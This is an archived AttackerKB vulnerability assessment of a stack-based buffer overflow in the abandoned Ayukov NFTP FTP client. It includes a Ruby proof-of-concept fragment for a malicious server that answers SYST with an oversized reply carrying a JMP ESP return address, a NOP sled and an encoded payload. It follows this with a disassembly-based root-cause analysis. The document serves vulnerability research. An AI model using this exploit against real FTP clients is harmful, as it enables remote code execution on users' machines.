---
title: Ayukov NFTP FTP Client Stack Buffer Overflow Analysis
author: wchen-r7
score: 1
topic_attacker_value: 0
topic_exploitability: 0
topic_disclosure_date: '2017-10-24T17:29:00'
created: '2019-09-12T18:08:05.881568'
revision_date: '2020-02-13T17:12:05.38284'
assessment_id: 5c838f72-dae8-4ff8-929e-342d025fe88e
topic_id: 572183a4-dc08-410b-b8ec-693e672dff54
topic_short_id: SyN1ovrPqI
topic_slug: ayukov-nftp-ftp-client-stack-buffer-overflow-analysis
akb_topic_url: https://attackerkb.com/topics/SyN1ovrPqI/ayukov-nftp-ftp-client-stack-buffer-overflow-analysis
akb_assessment_url: https://attackerkb.com/topics/SyN1ovrPqI/ayukov-nftp-ftp-client-stack-buffer-overflow-analysis#5c838f72-dae8-4ff8-929e-342d025fe88e
---

# Ayukov NFTP FTP Client Stack Buffer Overflow Analysis

*Assessment by wchen-r7, archived from [AttackerKB](https://attackerkb.com/topics/SyN1ovrPqI/ayukov-nftp-ftp-client-stack-buffer-overflow-analysis#5c838f72-dae8-4ff8-929e-342d025fe88e).*

---

## Details
Ayukov is an FTP client that was written by Sergey Ayukov back in 1994. Development stopped in 2011, and it is vulnerable to a stack-based buffer overflow vulnerability due to the way it handles the server input. The exploit was tested on Windows XP SP3 (English).

## PoC

Here's an example of how to crash the FTP client:

```ruby
  # Let the client log in
  client.get_once

  user = "331 OK.\r\n"
  client.put(user)

  client.get_once
  pass = "230 OK.\r\n"
  client.put(pass)

  sploit = "A"*4116
  sploit << [target.ret].pack('V') # JMP ESP here
  sploit << "\x90"*16
  sploit << payload.encoded
  sploit << "C" * (15000 - 4116 - 4 - 16 - payload.encoded.length)
  sploit << "\r\n"

  client.put(sploit)

  client.get_once
  pwd = "257\r\n"
  client.put(pwd)
  client.get_once
```

## Root Cause Analysis

When serving the PoC against the vulnerable app, the client's command prompt shows:

```
12:28:43 331 OK.
12:28:43 USER anonymous
12:28:43 230 OK.
12:28:43 Successfully logged in as 'anonymous@192.168.0.12'
12:28:43 SYST
12:28:43 .................. Lots of AAAAAs here .....................
12:28:43 TYPE I
12:28:43 257
```

The interesting part here is that when the client sends a ```SYST``` request, the server responds
with a long string of data attempting to cause a crash. This would be a good starting point to
investigate the root cause.

With IDA Pro, we can tell that the ```SYST``` string is at the following location:

```
.text:004096B6 ; char aSyst[]
.text:004096B6 aSyst           db 'SYST',0             ; DATA XREF: sub_409978+B8Co
```

When we cross reference, we can tell this is used by the ```OpenControlConnection``` function.
Although there is no symbol to identify the actual function name "OpenControlConnection", the
debugging message at the beginning of the function is a big hint:

```C
int __usercall OpenControlConnection@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  sub_45AF40(savedregs);
  *(_DWORD *)&name.sa_data[10] = a2;
  *(_DWORD *)&name.sa_data[6] = a3;
  *(_DWORD *)&name.sa_data[2] = a1;
  if ( !dword_477AEC )
    sub_419B4C(1);
  while ( 1 )
  {
    while ( 1 )
    {
      do
      {
        sub_403484("begin OpenControlConnection()\n", charResBuffer[4088]);
        ...
```

Anyway, inside the OpenControlConnection function, we can see that the ```SYST``` command is
requested here for SendFTPRequest (no symbol of clue of the name, I just decided to name it this
way):

```
.text:0040A504                 push    offset aSyst    ; "SYST"
.text:0040A509                 lea     eax, [ebp+charResBuffer]
.text:0040A50F                 push    eax             ; charResBuffer
.text:0040A510                 lea     eax, [ebp+args]
.text:0040A516                 push    eax             ; int
.text:0040A517                 push    0               ; int
.text:0040A519                 call    SendFTPRequest
```

Inside the SendFTPRequest function, it looks like this:

```C
int SendFTPRequest(int a1, int arg_4, char *charResBuffer, char *Format, ...)
{
  char *v4; // ebx@0
  int v5; // edi@0
  int v6; // esi@0
  char *v7; // edx@1
  char Dst[16384]; // [esp+18h] [ebp-4000h]@2
  char *savedregs; // [esp+4018h] [ebp+0h]@1
  va_list va; // [esp+4030h] [ebp+18h]@1

  va_start(va, Format);
  sub_45AF40(savedregs);
  savedregs = v4;
  v7 = Format;
  if ( Format )
  {
    v4 = Dst;
    // This actually checks the input for the FTP command from the client.
    // The 0x4000u indicates the string should not be longer than that, otherwise
    // there will be a buffer overflow warning in this function.
    snprintf1(Dst, 0x4000u, Format, va);
    v7 = Dst;
  }
  return SendReceive((int)v4, v5, v6, a1, arg_4, charResBuffer, v7);
}
```

We were able to tell the second argument for ```SendFTPRequest``` is actually a buffer for receiving
the server's response, because the way it is used:

```C
result = SendFTPRequest(0, (int)args, charResBuffer, "SYST");
if ( result == -4 )
  return result;
if ( result )
  goto LABEL_231;
if ( *(_DWORD *)args == 2 )
{
  sub_445CEC(charResBuffer);
  if ( strstr(charResBuffer, "unix") )
  {
    if ( strstr(charResBuffer, "powerweb") )
    {
      *(_DWORD *)dword_47B1E0 = 6;
      goto LABEL_206;
    }
  }
...
```

In addition, this buffer is actually on the stack, and it's 4096 long:

```
-00001010 charResBuffer   db 4096 dup(?)
```

This means that if the server responds with something longer than 4096 bytes for the ```SYST``` request,
the data may corrupt the stack, and cause a stack-based buffer overflow. At the end of
```OpenControlConnection```, the ```RETN``` ends up loading the corrupt data, which may lead to
arbitrary code execution:

```
.text:0040AC39                 lea     esp, [ebp-2048h]
.text:0040AC3F                 pop     ebx
.text:0040AC40                 pop     esi
.text:0040AC41                 pop     edi
.text:0040AC42                 leave
.text:0040AC43                 retn
```

Since whoever is using ```SendFTPRequest``` is responsible for providing the buffer of the server
response, and there are 47 other cross-references, it is possible there are different ways to
trigger the same bug. However, since it doesn't look like there is a patch (because the product
is no longer in active development, from the exploit developer's perspective, it is not necessary
to look for other ways to exploit it).
